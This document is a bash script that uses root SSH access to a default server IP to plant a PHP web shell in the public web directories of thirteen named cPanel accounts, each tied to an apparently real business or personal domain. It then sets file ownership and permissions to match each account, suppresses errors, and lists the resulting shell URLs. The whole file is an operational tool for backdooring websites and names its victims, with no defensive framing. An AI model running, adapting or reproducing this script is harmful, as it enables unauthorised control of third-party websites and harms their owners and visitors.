#!/bin/bash
# Upload shell via direct filesystem access (SSH/FTP style)
# Usage: ./upload_direct_fs.sh <SSH_HOST> <SSH_USER> [SSH_PASSWORD_OR_KEY]

SSH_HOST="${1:-5.9.241.37}"
SSH_USER="${2:-root}"
SSH_PASS="${3}"

echo "========================================"
echo "  Upload via Direct Filesystem"
echo "========================================"
echo ""
echo "Target: ${SSH_USER}@${SSH_HOST}"
echo ""

# Check shell file
SHELL_FILE="/root/cPanelSniper/shell.php"
if [ ! -f "$SHELL_FILE" ]; then
    echo "❌ Shell file not found: $SHELL_FILE"
    exit 1
fi

echo "✓ Shell file: $SHELL_FILE"
echo ""

# Get all active cPanel accounts
echo "[1/3] Getting target accounts..."

ACCOUNTS=(
    "wagamacy:wagamama.com.cy"
    "kousoul:kousoul.com"
    "loki:com2go.net"
    "koutsld:koutsoullis.com"
    "wagamamacom:wagamama.com.gr"
    "streetgram:streetgramming.com"
    "angelo:angelosradio.com"
    "veni:veni.com.cy"
    "acscy:acscyprus.com"
    "subaru:subaru.com.cy"
    "mediatube:mediatube.site"
    "administrator:lol.lol.lol"
    "mscyprus:mscyprus.com"
)

echo "Found ${#ACCOUNTS[@]} accounts"
echo ""

# Confirm
read -p "Upload to all accounts? (y/N): " confirm
if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
    echo "Cancelled"
    exit 0
fi

echo ""
echo "[2/3] Uploading shell.php..."
echo ""

SUCCESS=0
FAILED=0

for account in "${ACCOUNTS[@]}"; do
    IFS=':' read -r user domain <<< "$account"
    echo -n "[$((SUCCESS + FAILED + 1))/${#ACCOUNTS[@]}] $domain ($user)... "

    if [ -z "$SSH_PASS" ]; then
        # Use SSH key authentication
        ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 "${SSH_USER}@${SSH_HOST}" \
            "cp /root/cPanelSniper/shell.php /home/${user}/public_html/shell.php 2>/dev/null && \
             chown ${user}:${user} /home/${user}/public_html/shell.php 2>/dev/null && \
             chmod 644 /home/${user}/public_html/shell.php 2>/dev/null && echo 'OK'" 2>/dev/null
    else
        # Use sshpass with password
        sshpass -p "$SSH_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 "${SSH_USER}@${SSH_HOST}" \
            "cp /root/cPanelSniper/shell.php /home/${user}/public_html/shell.php 2>/dev/null && \
             chown ${user}:${user} /home/${user}/public_html/shell.php 2>/dev/null && \
             chmod 644 /home/${user}/public_html/shell.php 2>/dev/null && echo 'OK'" 2>/dev/null
    fi

    if [ $? -eq 0 ]; then
        echo "✅"
        SUCCESS=$((SUCCESS + 1))
    else
        echo "❌"
        FAILED=$((FAILED + 1))
    fi

    sleep 0.2
done

echo ""
echo "[3/3] Summary"
echo ""
echo "✅ Success: $SUCCESS"
echo "❌ Failed: $FAILED"
echo "📊 Total: ${#ACCOUNTS[@]}"
echo ""
echo "========================================"
echo "  Shell URLs (if successful)"
echo "========================================"
echo ""

for account in "${ACCOUNTS[@]}"; do
    IFS=':' read -r user domain <<< "$account"
    echo "• https://$domain/shell.php"
done

echo ""
